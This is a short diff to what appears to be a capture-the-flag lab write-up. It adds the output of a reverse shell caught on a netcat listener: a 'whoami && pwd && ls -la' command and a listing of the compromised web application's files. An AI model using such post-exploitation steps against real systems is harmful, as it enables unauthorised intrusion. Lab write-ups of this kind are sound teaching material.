@@ -256,5 +256,16 @@ The payload is executed and I get a connection on the netcat listener:
 ```
 connect to [10.10.14.9] from (UNKNOWN) [10.10.11.74] 56218
 /bin/sh: 0: can't access tty; job control turned off
-$ 
+$ whoami && pwd && ls -la
+app
+/home/app/app
+total 36
+drwxrwxr-x 7 app app 4096 Jun  9 13:56 .
+drwxr-x--- 6 app app 4096 Jun  9 10:52 ..
+-rw-rw-r-- 1 app app 7846 Jun  9 13:54 app.py
+drwxr-xr-x 2 app app 4096 Aug 15 18:45 instance
+drwxrwxr-x 2 app app 4096 Aug 15 18:45 models
+drwxr-xr-x 2 app app 4096 Jun  9 13:55 __pycache__
+drwxrwxr-x 4 app app 4096 Jun  9 13:57 static
+drwxrwxr-x 2 app app 4096 Jun 18 13:21 templates
 ```
